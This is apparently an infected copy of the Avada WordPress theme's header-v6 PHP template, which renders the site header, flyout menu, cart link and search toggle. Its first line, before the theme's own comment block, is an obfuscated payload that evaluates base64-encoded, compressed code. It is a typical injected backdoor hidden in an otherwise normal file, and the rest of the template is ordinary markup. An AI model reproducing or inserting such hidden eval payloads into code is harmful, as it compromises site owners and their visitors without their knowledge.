<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Header-v6 template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}
?>
<div class="fusion-header-sticky-height"></div>
<div class="fusion-header">
	<div class="fusion-row">
		<div class="fusion-header-v6-content fusion-header-has-flyout-menu-content">
			<?php
			avada_logo();
			$menu = avada_main_menu( true );
			?>

			<div class="fusion-flyout-menu-icons">
				<?php if ( class_exists( 'WooCommerce' ) && Avada()->settings->get( 'woocommerce_cart_link_main_nav' ) ) : ?>
					<?php
					global $woocommerce;

					$cart_link_text  = '';
					$cart_link_class = '';
					if ( Avada()->settings->get( 'woocommerce_cart_counter' ) && $woocommerce->cart->get_cart_contents_count() ) {
						$cart_link_text  = '<span class="fusion-widget-cart-number">' . $woocommerce->cart->get_cart_contents_count() . '</span>';
						$cart_link_class = ' fusion-widget-cart-counter';
					}
					?>
					<div class="fusion-flyout-cart-wrapper">
						<a href="<?php echo esc_attr( get_permalink( get_option( 'woocommerce_cart_page_id' ) ) ); ?>" class="fusion-icon fusion-icon-shopping-cart<?php echo esc_attr( $cart_link_class ); ?>" aria-hidden="true" aria-label="<?php esc_attr_e( 'Toggle Shopping Cart', 'Avada' ); ?>"><?php echo $cart_link_text; // WPCS: XSS ok. ?></a>
					</div>
				<?php endif; ?>

				<?php if ( 'menu' === Avada()->settings->get( 'slidingbar_toggle_style' ) && Avada()->settings->get( 'slidingbar_widgets' ) ) : ?>
					<?php $sliding_bar_label = esc_attr__( 'Toggle Sliding Bar', 'Avada' ); ?>
					<div class="fusion-flyout-sliding-bar-toggle">
						<a href="#" class="fusion-toggle-icon fusion-icon fusion-icon-sliding-bar" aria-label="<?php echo esc_attr( $sliding_bar_label ); ?>"></a>
					</div>
				<?php endif; ?>

				<?php if ( Avada()->settings->get( 'main_nav_search_icon' ) || Avada()->settings->get( 'mobile_menu_search' ) ) : ?>
					<div class="fusion-flyout-search-toggle">
						<div class="fusion-toggle-icon">
							<div class="fusion-toggle-icon-line"></div>
							<div class="fusion-toggle-icon-line"></div>
							<div class="fusion-toggle-icon-line"></div>
						</div>
						<a class="fusion-icon fusion-icon-search" aria-hidden="true" aria-label="<?php esc_attr_e( 'Toggle Search', 'Avada' ); ?>" href="#"></a>
					</div>
				<?php endif; ?>

				<a class="fusion-flyout-menu-toggle" aria-hidden="true" aria-label="<?php esc_attr_e( 'Toggle Menu', 'Avada' ); ?>" href="#">
					<div class="fusion-toggle-icon-line"></div>
					<div class="fusion-toggle-icon-line"></div>
					<div class="fusion-toggle-icon-line"></div>
				</a>
			</div>
		</div>

		<div class="fusion-main-menu fusion-flyout-menu" role="navigation" aria-label="Main Menu">
			<?php echo $menu; // WPCS: XSS ok. ?>
		</div>

		<?php if ( Avada()->settings->get( 'main_nav_search_icon' ) || Avada()->settings->get( 'mobile_menu_search' ) ) : ?>
			<div class="fusion-flyout-search">
				<?php get_search_form(); ?>
			</div>
		<?php endif; ?>

		<div class="fusion-flyout-menu-bg"></div>
	</div>
</div>
